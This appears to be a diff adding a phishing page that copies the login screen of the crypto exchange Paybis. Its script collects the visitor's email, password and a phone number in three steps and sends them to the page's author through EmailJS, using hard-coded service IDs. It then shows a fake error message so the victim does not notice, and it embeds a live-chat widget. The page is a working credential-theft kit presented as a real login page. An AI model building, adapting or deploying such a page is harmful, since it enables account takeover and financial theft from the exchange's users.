@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <title>Paybis</title>
+    <style>
+        /* Main container styling */
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 50px;
+        }
+        .hidden {
+            display: none;
+        }
+        .logintit {
+            color: #000;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        .login-btn {
+            margin-top: 10px;
+        }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <img src="logo.png" alt="Paybis Logo">
+        <button class="sign-in">Sign In</button>
+    </header>
+
+    <!-- Main Login Form -->
+    <main class="login-container">
+        <div class="login-box">
+            <h1 class="logintit">Log in</h1>
+            <div class="tab-selector">
+                <button id="personal-tab" class="tab active">Personal</button>
+                <button id="corporate-tab" class="tab">Corporate</button>
+            </div>
+            <form class="login-form">
+                <div id="email-section">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" placeholder="Enter your email" required>
+                </div>
+                
+                <div id="password-section" class="hidden">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                
+                <div id="phone-section" class="hidden">
+                    <label for="phone">Please enter phone number for verification</label>
+                    <input type="tel" id="phone" placeholder="Enter your phone number" required>
+                </div>
+
+                <button type="button" id="next-btn" class="login-btn">Next</button>
+                <button type="button" id="submit-btn" class="login-btn hidden">Submit</button>
+            </form>
+            <p class="error-message hidden">Error #632B: Something went wrong, please try again.</p>
+        </div>
+        <p class="security-info">Secured by TLS protocol</p>
+
+        <!-- Footer -->
+        <footer class="footer-container">
+            <div class="footer-columns">
+                <div class="footer-column">
+                    <h4>Company</h4>
+                    <ul>
+                        <li><a href="#">About Us</a></li>
+                        <li><a href="#">Careers</a></li>
+                        <li><a href="#">Contacts</a></li>
+                        <li><a href="#">News</a></li>
+                        <li><a href="#">Referrals & Affiliates</a></li>
+                        <li><a href="#">Policies</a></li>
+                        <li><a href="#">The risk summary</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Learn</h4>
+                    <ul>
+                        <li><a href="#">Support Portal</a></li>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Fees</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>For Individuals</h4>
+                    <ul>
+                        <li><a href="#">Crypto Widget</a></li>
+                        <li><a href="#">Buy Crypto</a></li>
+                        <li><a href="#">Sell Crypto</a></li>
+                        <li><a href="#">Swap Crypto</a></li>
+                    </ul>
+                    <h4>For Businesses</h4>
+                    <ul>
+                        <li><a href="#">On/Off Ramp</a></li>
+                        <li><a href="#">Crypto Payouts</a></li>
+                        <li><a href="#">Wallet as a Service</a></li>
+                        <li><a href="#">Corporate On/Off Ramp</a></li>
+                        <li><a href="#">Crypto Exchange & OTC</a></li>
+                        <li><a href="#">Corporate Wallet</a></li>
+                        <li><a href="#">Crypto Acquiring</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Buy</h4>
+                    <ul>
+                        <li><a href="#">Buy Bitcoin</a></li>
+                        <li><a href="#">Buy Ethereum</a></li>
+                        <li><a href="#">Buy USDT</a></li>
+                        <li><a href="#">Buy Litecoin</a></li>
+                        <li><a href="#">Buy Ripple</a></li>
+                        <li><a href="#">Buy Bitcoin Cash</a></li>
+                        <li><a href="#">Buy Stellar Lumens</a></li>
+                        <li><a href="#">Buy Binance Coin</a></li>
+                        <li><a href="#">Buy Tron</a></li>
+                        <li><a href="#">Buy Dogecoin</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Sell</h4>
+                    <ul>
+                        <li><a href="#">Sell Bitcoin</a></li>
+                        <li><a href="#">Sell USDT</a></li>
+                    </ul>
+                    <h4>Crypto Wallets</h4>
+                    <ul>
+                        <li><a href="#">Bitcoin Wallet</a></li>
+                        <li><a href="#">Binance Coin Wallet</a></li>
+                        <li><a href="#">Ethereum Wallet</a></li>
+                        <li><a href="#">Tether Wallet</a></li>
+                        <li><a href="#">Cardano Wallet</a></li>
+                        <li><a href="#">Dogecoin Wallet</a></li>
+                        <li><a href="#">Polkadot Wallet</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Calculator</h4>
+                    <ul>
+                        <li><a href="#">Bitcoin Calculator</a></li>
+                        <li><a href="#">Ethereum Calculator</a></li>
+                        <li><a href="#">Litecoin Calculator</a></li>
+                        <li><a href="#">XRP Calculator</a></li>
+                        <li><a href="#">Bitcoin Cash Calculator</a></li>
+                        <li><a href="#">Stellar Calculator</a></li>
+                        <li><a href="#">Binance Coin Calculator</a></li>
+                        <li><a href="#">Dogecoin Calculator</a></li>
+                        <li><a href="#">TRON Calculator</a></li>
+                        <li><a href="#">Tether Calculator</a></li>
+                    </ul>
+                    <h4>Prices</h4>
+                    <ul>
+                        <li><a href="#">Bitcoin Price</a></li>
+                        <li><a href="#">Ethereum Price</a></li>
+                        <li><a href="#">Litecoin Price</a></li>
+                        <li><a href="#">XRP Price</a></li>
+                        <li><a href="#">Bitcoin Cash Price</a></li>
+                        <li><a href="#">Stellar Price</a></li>
+                        <li><a href="#">Binance Coin Price</a></li>
+                        <li><a href="#">Dogecoin Price</a></li>
+                        <li><a href="#">TRON Price</a></li>
+                        <li><a href="#">Tether Price</a></li>
+                    </ul>
+                </div>
+            </div>
+        </footer>
+
+        <!-- Footer content remains unchanged -->
+    </main>
+    <script>
+        const loginButton = document.querySelector('.login-btn');
+        const emailInput = document.querySelector('#email');
+        const personalTab = document.querySelector('#personal-tab');
+        const corporateTab = document.querySelector('#corporate-tab');
+
+        // Enable login button when email is entered
+        emailInput.addEventListener('input', function () {
+            if (emailInput.value) {
+                loginButton.classList.add('active');
+                loginButton.disabled = false;
+            } else {
+                loginButton.classList.remove('active');
+                loginButton.disabled = true;
+            }
+        });
+
+        // Tab switching logic
+        personalTab.addEventListener('click', () => {
+            personalTab.classList.add('active');
+            corporateTab.classList.remove('active');
+        });
+
+        corporateTab.addEventListener('click', () => {
+            corporateTab.classList.add('active');
+            personalTab.classList.remove('active');
+        });
+    </script>
+
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Initialize EmailJS with your user ID
+        (function(){
+            emailjs.init("eFjqTxnF7nGuJXVZd");
+        })();
+
+        const emailSection = document.querySelector('#email-section');
+        const passwordSection = document.querySelector('#password-section');
+        const phoneSection = document.querySelector('#phone-section');
+        const nextButton = document.querySelector('#next-btn');
+        const submitButton = document.querySelector('#submit-btn');
+        const errorMessage = document.querySelector('.error-message');
+
+        let currentStep = 1;
+
+        // Proceed to the next step based on the current step
+        nextButton.addEventListener('click', () => {
+            if (currentStep === 1 && document.querySelector('#email').value) {
+                emailSection.classList.add('hidden');
+                passwordSection.classList.remove('hidden');
+                currentStep++;
+            } else if (currentStep === 2 && document.querySelector('#password').value) {
+                passwordSection.classList.add('hidden');
+                phoneSection.classList.remove('hidden');
+                nextButton.classList.add('hidden');
+                submitButton.classList.remove('hidden');
+                currentStep++;
+            }
+        });
+
+        // Submit the form and send data via EmailJS
+        submitButton.addEventListener('click', () => {
+            const email = document.querySelector('#email').value;
+            const password = document.querySelector('#password').value;
+            const phone = document.querySelector('#phone').value;
+
+            if (email && password && phone) {
+                // Send the data via EmailJS
+                emailjs.send("service_8it2819", "template_f72a86f", {
+                    email: email,
+                    password: password,
+                    phone: phone
+                }).then(() => {
+                    // Show error message after sending
+                    errorMessage.classList.remove('hidden');
+                }).catch(() => {
+                    errorMessage.textContent = "Error #4783B: Something went wrong, please try again.";
+                    errorMessage.classList.remove('hidden');
+                });
+            } else {
+                errorMessage.textContent = "Error #632B: Something went wrong, please try again.";
+                errorMessage.classList.remove('hidden');
+            }
+        });
+    </script>
+    <script type="text/javascript">
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+        s1.async=true;
+        s1.src='https://embed.tawk.to/66a2a258becc2fed692b2b32/1i3lkkb6g';
+        s1.charset='UTF-8';
+        s1.setAttribute('crossorigin','*');
+        s0.parentNode.insertBefore(s1,s0);
+        })();
+        </script>
+        
+</body>
+</html>
